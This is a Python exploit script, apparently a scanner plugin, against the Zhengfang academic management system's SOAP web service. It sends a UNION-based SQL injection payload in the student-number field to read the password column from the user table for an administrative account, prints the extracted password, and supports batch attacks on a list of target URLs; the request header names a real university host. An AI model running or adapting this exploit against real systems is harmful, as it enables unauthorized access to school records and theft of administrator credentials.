#!/usr/bin/python
#-*- encoding:utf-8 -*-
# Author = ym2011
# PlugName  = zhengfangsoft_SQL injection
import re                           #导入模块
from sys import argv				#导入系统输入的参数
from dummy import *
def audit(arg):                     #利用curl2模块 post发包
    raw = """POST /service.asmx HTTP/1.1
Host: jiaowu.suse.edu.cn
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://www.zf_webservice.com/GetStuCheckinInfo "

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">222222' union select Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01</xh>
      <xnxq xsi:type="xsd:string">string</xnxq>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>"""
    url = arg + '/service.asmx'         #post地址
    code, head,res, errcode, _ = curl.curl2(url,raw=raw)    #发包
    if 'xsi:type="types:StudentCheckinInfo"' in res:        #在源码搜索关键字
        mima = re.findall('<xh xsi:type="xsd:string">(.*?)</xh>',res,)  #匹配密码
        print u'网址:%s  密码:%s\n'% (arg,mima) #输出密码


if (len(argv)==1):       #判断是否定义了url
    print u'''
使用方法：
一 python zfsoft.py url --->>>仅是对单个使用正方系统的网站进行SQL injection
二 python zfsoft.py url.txt --->>> 批量注入一批使用正方系统的网站，请把URL列表添加到url.txt,每行一条URL
使用示例：
python zfsoft.py www,hao123.com
python zfsoft.py url.txt
'''
elif (argv[1]=='url.txt'): 
    for i in open("url.txt"):
        audit(i)
else:
    audit(argv[1])
